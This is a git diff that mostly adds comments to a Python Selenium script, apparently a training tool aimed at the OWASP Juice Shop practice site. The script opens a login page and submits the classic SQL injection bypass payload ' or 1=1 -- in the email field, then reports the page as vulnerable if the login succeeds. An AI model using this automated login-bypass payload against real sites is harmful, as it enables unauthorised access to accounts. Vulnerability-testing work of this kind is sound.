@@ -48,26 +48,26 @@ def check_form_val(driver,site):
             lista.append(link)
         else:
             print(f'{site}{link} has no input form to exploit')
-    if '/login/' in  lista:
+    if '/login/' in  lista: #check if link has login 
         link2='/login/'
         loginsqlinjection(site,link2)
 
 
 
-def loginsqlinjection(site,link2):
+def loginsqlinjection(site,link2): #check for sql injection
     browser=webdriver.Firefox()
-    browser.get(f'{site}{link2}')
+    browser.get(f'{site}{link2}') #open link in firefox browser
     sleep(2)
-    browser.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click()
+    browser.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
     browser.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
-    password=browser.find_element_by_xpath('//*[@id="password"]')
+    password=browser.find_element_by_xpath('//*[@id="password"]') 
     text='sqlinjection'
     for characters in text:
         password.send_keys(characters)
-        sleep(0.3)
-    browser.find_element_by_xpath('//*[@id="loginButton"]').click()
+        sleep(0.3) #set username and password 
+    browser.find_element_by_xpath('//*[@id="loginButton"]').click() 
     sleep(5)
-    if browser.current_url=='https://juice-shop.herokuapp.com/#/search':
+    if browser.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed 
           print("your page is vulnerable to sql injection")
     else:
         print("login failed")
